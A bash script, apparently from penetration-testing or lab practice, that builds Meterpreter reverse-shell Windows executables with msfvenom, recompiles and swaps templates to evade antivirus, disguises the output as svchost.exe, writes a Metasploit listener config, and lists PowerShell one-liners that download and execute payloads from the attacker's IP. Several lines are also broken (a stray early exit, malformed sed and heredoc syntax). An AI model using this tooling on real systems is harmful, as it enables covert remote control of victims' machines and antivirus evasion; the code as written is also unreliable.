#!/bin/bash


IP="10.10.14.19"
PORT="8550"



function get_ip_helper() {
    ###
    #   Helper function to get the system's list of ip addresses
    #   and have the user choose one from the list to be used for something.
    #
    #   This will allow user to choose IP from list or enter it manually
    #   the resulting IP is stored in variable "$chosen_ip"
    ###
    options=("Choose IP From List" "Enter IP Manually")
    PS3="[+] To get your IP Address, you have two options> "
    select name in "${options[@]}"; do
        case $REPLY in
            1)
                # function call here doesn't work well, so just checking "chosen_ip" is empty later
                break
                ;;
            2)
                echo -e -n "[+] Enter new IP address: "
                read chosen_ip
                break
                ;;

        esac
    done

    if [[ ! "$chosen_ip" ]]; then
        # We don't yet have an IP, so proceed with choices
        addresses="$(hostname -I)"
        #addresses+=("Manually enter IP")
        PS3="[+] Choose IP to use> "
        #for i in $(hostname -I | awk '{print $i}'); do
        # Leave off quotes for this expression so word splitting still occurs during expansion
        select address in ${addresses}; do
            #echo -e "[DBG] IP: $i"
            case $REPLY in
                1|2|3|4)
                    chosen_ip="$address"
                    break
                    ;;
            esac
        done
    fi
    if [[ ! "$chosen_ip" ]]; then
        echo -e "[!] Error choosing IP Address, sorry!"
        exit 1
    fi
    # check if specified IP is properly formatted
    if [[ ! $IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        echo -e "[!] Invalid IP format"
        exit 1
    fi
    echo -e "[*] Using IP address $chosen_ip for payload creation"
}

get_ip_helper

exit 0









[[ ! -d ~/transfer-stage ]] && mkdir ~/transfer-stage
cd ~/transfer-stage
mkdir avbypass
cd avbypass


# Baseline payload creation for Windows target
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f exe > 1_payload_baseline.exe


# The template this uses to create our exe is located here:
template_dir=/usr/share/metasploit-framework/data/templates/src/pe/exe
cp -r "${template_dir}"/* .
file="template.c"
# Change the memory allocation size from 4096 to something else
sed -i '^#define SCSIZE.*/#define SCSIZE 5000/' "${file}"


# We can decrease detection by simply compiling this source code ourselves, with code edits
# and then use it as our template in the payload creation

i686-w64-mingw32-gcc template.c -lws2_32 -o template_recompiled.exe

# Using the template binary MSF provides
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=${IP} LPORT=${PORT} \
    -x template_recompiled.exe \
    -b \x00\x0a\x0d \
    -f exe > 2_payload_recompiled.exe

# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\x0a\x0d


### Using a custom binary

if [[ ! -f ./notepad.exe ]]; then
    cp /usr/lib/x86_64-linux-gnu/wine/notepad.exe .
fi


# Using the a custom binary as the template is best
# NOTE: Transferring this to a Win 10 target via powershell wget it was still deleted by AV after a few minutes
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=${IP} LPORT=${PORT} \
    -x notepad.exe \
    -b \x00\x0a\x0d \
    -f exe > 3_payload_custom.exe

# Give a good name
cp 3_payload_custom.exe svchost.exe


# Catch these using MSF like this:
cat <EOF>> handler.rc
use exploit/multi/handler
set LHOST ${IP}
set LPORT ${PORT}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set ExitOnSession false
exploit -j -z
EOF



### Windows File Transfer Methods for payload
# - https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/
#
## Basic
#       powershell wget http://10.10.14.19:8000/avbypass/noav.exe -o noav.exe
#
#
# powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
# powershell -exec bypass -c "iwr('http://${IP}/payload.ps1')|iex"
#
#
#
#
#
#
